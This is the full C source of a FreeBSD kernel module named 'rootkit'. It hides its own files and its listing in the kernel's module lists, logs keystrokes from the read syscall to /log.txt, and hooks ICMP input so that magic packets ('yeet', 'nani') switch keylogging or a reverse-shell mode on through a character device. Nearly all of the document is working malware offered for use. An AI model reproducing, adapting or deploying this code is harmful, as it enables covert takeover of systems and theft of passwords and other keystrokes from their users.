#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

#include <sys/dirent.h>

#include <sys/mbuf.h> 
#include <sys/protosw.h>
#include <netinet/in.h> 
#include <netinet/in_systm.h> 
#include <netinet/ip.h> 
#include <netinet/ip_icmp.h> 
#include <netinet/ip_var.h>

#include <sys/pcpu.h>
#include <sys/syscallsubr.h>
#include <sys/unistd.h>
#include <sys/uio.h>
#include <sys/file.h>
#include <sys/fcntl.h>

#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/conf.h>
#include <sys/stat.h>
//=======HIDING KLD===========


#define MODULE_NAME "rootkit"
#define FILE_NAME "rootkit.ko"
#define LOG_FILE "/log.txt"
#define CMDLEN 100
#define KEYLOG "yeet"
#define RSHELL "nani"

extern linker_file_list_t linker_files;
extern struct sx kld_sx;
extern int next_file_id;

#define    LINKER_GET_NEXT_FILE_ID(a) do {          \
    linker_file_t lftmp;                            \
                                                    \
    if (!cold)                                      \
        sx_assert(&kld_sx, SA_XLOCKED);             \
retry:                                              \
    TAILQ_FOREACH(lftmp, &linker_files, link) {     \
        if (next_file_id == lftmp->id) {            \
            next_file_id++;                         \
            goto retry;                             \
        }                                           \
    }                                               \
    (a) = next_file_id;                             \
} while(0)\


typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;

struct module {
    TAILQ_ENTRY(module)    link;    
    TAILQ_ENTRY(module)    flink;    
    struct linker_file    *file;   
    int            refs;    
    int             id;   
    char             *name;    
    modeventhand_t         handler;    
    void                *arg;    
    modspecific_t        data;    
};

static int last_kld = -1;
static struct linker_file *save_lf;
static struct module *save_mod;

static int activated = 0;

// List of files to be hidden
char *T_NAME[] = {"rootkit.ko", "controller", "log.txt", "priv_esc", "daemon", "install"};
static int t_name_len = sizeof(T_NAME)/sizeof(T_NAME[0]);

// Hide files from being listed
//===============================================================================
static int getdirentries_hook(struct thread *td, void *syscall_args) {
	struct getdirentries_args *uap;
	uap = (struct getdirentries_args *)syscall_args;

	struct dirent *dp, *current;
	unsigned int size, count;

	sys_getdirentries(td, syscall_args);
	size = td->td_retval[0];

	if (size > 0) {
		MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
		copyin(uap->buf, dp, size);

		current = dp;
		count = size;

		while ((current->d_reclen != 0) && (count > 0)) {
			count -= current->d_reclen;
			for (int i=0; i<t_name_len; i++) {
				if(strcmp((char *)&(current->d_name), T_NAME[i]) == 0)
				{
					if (count != 0)
						bcopy((char *)current + current->d_reclen, current, count);

					size -= current->d_reclen;
					break;
				}
			}

			if (count != 0)
				current = (struct dirent *)((char *)current + current->d_reclen);
		}

		td->td_retval[0] = size;
		copyout(dp, uap->buf, size);

		FREE(dp, M_TEMP);
	}

	return 0;
}
//===============================================================================

//================================== KEY LOGGING ================================
static int write_kernel2userspace(struct thread *td, char c){

	int error;
	// open file to save at
	
	/*
		If the pathname given in pathname is relative and dirfd is the special value AT_FDCWD, 
		then pathname is interpreted relative to the current working directory of the calling process 
	*/
	error = kern_openat(td, AT_FDCWD, LOG_FILE, UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0666);
    
    if (error){
        uprintf("open error %d\n", error);
        return(error);
    }
    int keylog_fd = td->td_retval[0];
    int buf[1] = {c};

    /*
		UIO: This structure is used for moving data between 
		the kernel and user spaces through read() and write() system calls. 
    */
    struct iovec aiov;
    struct uio auio; 

    //zero's out structs
    bzero(&auio, sizeof(auio));
    bzero(&aiov, sizeof(aiov));
    
    /*	
    	The writev() system call writes iovcnt buffers of data described .....
    	by iov to the file associated with the file descriptor fd ("gather output").

    	writev() writes out the entire contents of iov[0] before proceeding to iov[1], and so on.
    */
    aiov.iov_base = &buf; //starting address of buffer
    aiov.iov_len = 1; //number of bytes to transfer


    auio.uio_iov = &aiov; 			/*	scatter/gather list */
    auio.uio_iovcnt = 1; 			/*	length of scatter/gather list */
    auio.uio_offset = 0; 			/*	offset in target object	*/
    auio.uio_resid = 1; 			/*	remaining bytes	to copy	*/
    auio.uio_segflg = UIO_SYSSPACE; /*	address	space */
    auio.uio_rw = UIO_WRITE;		/*	operation */
    auio.uio_td = td;				/*	owner */
    
    error = kern_writev(td, keylog_fd, &auio);
    if (error){
        uprintf("write error %d\n", error);
        return error;
    }
    struct close_args fdtmp;
    fdtmp.fd = keylog_fd;
    sys_close(td, &fdtmp);

	return(error);
}

static int read_hook(struct thread *td, void *syscall_args){

	struct read_args *uap;
	uap = (struct read_args *)syscall_args;
	// Look until the end of array for my pin number
	char printable[] = {'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','!','"','#','$','%','&','\'','(',')','*','+',',','-','.','/',':',';','<','=','>','?','@','[','\\',']','^','_','`','{','|','}','~',' ','\t','\n','\r','\x0b','\x0c'}; // PIN: 1337
	int error;
	int i;
	char buf[1];
	size_t done;

	error = sys_read(td, syscall_args);

	//checks if data read is keystroke
	if (error || (!uap->nbyte)||(uap->nbyte > 1)|| (uap->fd != 0))
		return(error); 
	
	copyinstr(uap->buf, buf, 1, &done);
	i = 0;
	do {
		if (buf[0] == printable[i]) {
			write_kernel2userspace(td, buf[0]);
		}
		i++;
	} while (printable[i] != '\x0c');

	return(error);
}
//==============================================================================

// Hide the kernel module from being listed
//==============================================================================
static int hide_kld(void)
{
    struct linker_file *lf;
    struct module *mod;
    
    mtx_lock(&Giant);
    sx_xlock(&kld_sx);
    
    if ((&linker_files)->tqh_first->refs > 2)
        (&linker_files)->tqh_first->refs -= 2;
    
    TAILQ_FOREACH(lf, &linker_files, link)
    {
        if (strcmp(lf->filename, FILE_NAME) == 0)
        {
            if (next_file_id == lf->id)
                last_kld = 1;
            else
                last_kld = 0;
            
            save_lf = lf;
            
            if (last_kld)
                next_file_id--;
            
            TAILQ_REMOVE(&linker_files, lf, link);
            break;
        }
    }
    sx_xunlock(&kld_sx);
    mtx_unlock(&Giant);

    MOD_XLOCK;
    TAILQ_FOREACH(mod, &modules, link)
    {
        if (strcmp(mod->name, "sys/rootkit") == 0)
        {
            save_mod = mod;
            if (last_kld)
                nextid--;
            TAILQ_REMOVE(&modules, mod, link);
            break;
        }
    }
    MOD_XUNLOCK;
    
    return 0;
}


static int unhide_kld(void){
    if (!save_lf)
        return -1;
    
    mtx_lock(&Giant);
    sx_xlock(&kld_sx);
    
    (&linker_files)->tqh_first->refs += 2;
    
    LINKER_GET_NEXT_FILE_ID(save_lf->id);
    
    TAILQ_INSERT_TAIL(&linker_files, save_lf, link);
    
    sx_xunlock(&kld_sx);
    mtx_unlock(&Giant);

    if (!save_mod)
        return -1;
    
    MOD_XLOCK;
    
    save_mod->id = nextid++;
    TAILQ_INSERT_TAIL(&modules, save_mod, link);
    
    MOD_XUNLOCK;
    
    save_lf = 0;
    save_mod = 0;
    
    return 0;
}
//==============================================================================

// Create a character device
//==============================================================================

d_open_t open;
d_close_t close;
d_read_t read;
d_write_t write;

static struct cdevsw devsw = {
.d_version = D_VERSION,
.d_open = open,
.d_close = close,
.d_read = read,
.d_write = write,
.d_name = "cd"
};

static char icmp_cmd[CMDLEN] = "none";
static size_t len = 4;

int open(struct cdev *dev, int flag, int otyp, struct thread *td) {
	return 0;
}

int close(struct cdev *dev, int flag, int otyp, struct thread *td) {
	return 0;
}

int write(struct cdev *dev, struct uio *uio, int ioflag) {
	int error = 0;
	error = copyinstr(uio->uio_iov->iov_base, &icmp_cmd, CMDLEN-1, &len);
	if (error != 0) {
		uprintf("Write to device failed\n");
	}
	return error;
}

int read(struct cdev *dev, struct uio *uio, int ioflag) {
	int error = 0;
	if (len <= 0) {
		error = -1;
	}
	else {
		copystr(&icmp_cmd, uio->uio_iov->iov_base, CMDLEN, &len);
	}
	memset(&icmp_cmd, '\0', CMDLEN);
	strcpy(icmp_cmd, "none");
	len = 4;
	return error;
}

static struct cdev *sdev;

//==============================================================================

// ICMP hook
//==============================================================================

extern struct protosw inetsw[];
int icmp_input_hook(struct mbuf **m, int *off, int proto);

int icmp_input_hook(struct mbuf **m, int *off, int proto){
	struct icmp *icp;
	int hlen = *off;

	/* Locate the ICMP message within m. */
	(*m)->m_len -= hlen;
	(*m)->m_data += hlen;

	/* Extract the ICMP message. */
	icp = mtod(*m, struct icmp *);

	/* Restore m. */
	(*m)->m_len += hlen;
	(*m)->m_data -= hlen;

	/* Is this the ICMP message we are looking for? */
	if (strncmp(icp->icmp_data, KEYLOG, 4) == 0) {
		printf("icmp key\n");
		memset(&icmp_cmd, '\0', CMDLEN);
		strncpy(icmp_cmd, "key", 3);
		len = 3;
		return 0;
	}

	else if (strncmp(icp->icmp_data, RSHELL, 4) == 0) {
		printf("icmp shell\n");
		memset(&icmp_cmd, '\0', CMDLEN);
		strncpy(icmp_cmd, "shell", 5);
		len = 5;
		return 0;
	}
	else{
		memset(&icmp_cmd, '\0', CMDLEN);
		strncpy(icmp_cmd, "ping", 4);
		len = 4;
		return (icmp_input(m, off, proto));
	}

	return (icmp_input(m, off, proto));
}
//==============================================================================

struct control_arg{
	char *option;	
};

static int control(struct thread *td, void *arg) {
	struct control_arg *uap;
	uap = (struct control_arg *)arg;
	if (strcmp(uap->option, "on") == 0 && activated == 0) {
		sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
		sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
        sdev = make_dev(&devsw, 0, UID_ROOT, GID_WHEEL, 0600, "cd");
		hide_kld();
		activated = 1;
	}
	else if (strcmp(uap->option, "off") == 0 && activated == 1) {
		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
		sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
		destroy_dev(sdev);
		unhide_kld();
		activated = 0;
	}
	return 0;
}

static struct sysent control_sysent = {
	1,
	control
};

static int offset = NO_SYSCALL;

static int load(struct module *module, int cmd, void *arg) {
	int error = 0;
	
	switch (cmd) {
		case MOD_LOAD:
			//uprintf("Rootkit loaded at %d\n", offset);
			sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
			sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
			inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
        	sdev = make_dev(&devsw, 0, UID_ROOT, GID_WHEEL, 0600, "cd");
			hide_kld();
			activated = 1;
			break;
			
		case MOD_UNLOAD:
			//uprintf("Rootkit unloaded from %d\n", offset);
			if (activated == 1) {
				sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
				sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
				inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
				destroy_dev(sdev);
				unhide_kld();
				activated = 0;
			}
			
			break;
			
		default:
			error = EOPNOTSUPP;
			break;	
	}
	return error;
}

SYSCALL_MODULE(rootkit, &offset, &control_sysent, load, NULL);
